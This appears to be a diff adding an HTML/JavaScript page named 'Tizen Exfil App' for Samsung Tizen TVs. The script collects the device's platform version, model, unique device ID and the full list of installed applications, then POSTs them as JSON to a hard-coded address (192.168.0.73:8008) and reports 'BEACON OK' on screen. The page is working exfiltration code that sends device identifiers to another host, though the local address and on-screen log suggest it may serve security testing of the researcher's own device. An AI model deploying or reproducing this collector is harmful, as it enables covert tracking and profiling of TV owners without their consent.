@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<style>
+body{background:#000;color:#0f0;font-family:monospace;font-size:32px;padding:40px}
+#log{white-space:pre-wrap;word-wrap:break-word;min-height:600px}
+.ok{color:#0f0}.err{color:#f44}.info{color:#0ff}.warn{color:#ff0}
+</style></head>
+<body>
+<h1 style="color:#0ff">Tizen Exfil App</h1>
+<div id="log">Collecting...<br></div>
+<script>
+var log = document.getElementById('log');
+function say(m, c) { var d = document.createElement('div'); d.className = c || 'info'; d.textContent = m; log.appendChild(d); }
+
+var data = {
+    source: 'tizen-exfil-app',
+    ts: new Date().toISOString(),
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    tizen: (typeof tizen !== 'undefined') ? true : false
+};
+
+// Collect Tizen system info
+try {
+    data.platform_version = tizen.systeminfo.getCapability('http://tizen.org/feature/platform.version');
+    say('Tizen ' + data.platform_version, 'ok');
+} catch(e) { say('platform err: ' + e.message, 'warn'); }
+
+try {
+    data.model = tizen.systeminfo.getCapability('http://tizen.org/feature/model');
+    say('Model: ' + data.model, 'ok');
+} catch(e) {}
+
+try {
+    data.device_id = tizen.systeminfo.getCapability('http://tizen.org/feature/device.id');
+    say('DUID: ' + data.device_id, 'ok');
+} catch(e) {}
+
+// Collect installed apps
+try {
+    tizen.application.getAppInfo(function(apps) {
+        data.apps = apps.map(function(a) {
+            return {id: a.id, name: a.name, pkg: a.package, ver: a.version};
+        });
+        say('Apps: ' + apps.length, 'ok');
+        beacon();
+    }, function(err) {
+        data.apps_error = err.message;
+        say('Apps err: ' + err.message, 'err');
+        beacon();
+    });
+} catch(e) {
+    data.apps_error = e.message;
+    say('Apps err: ' + e.message, 'err');
+    beacon();
+}
+
+function beacon() {
+    say('Beaconing...', 'info');
+    fetch('http://192.168.0.73:8008/tv-results', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data, null, 2)
+    }).then(function(r) { return r.text(); })
+      .then(function(t) { say('BEACON OK: ' + t, 'ok'); })
+      .catch(function(e) { say('BEACON FAIL: ' + e.message, 'err'); });
+}
+</script>
+</body></html>
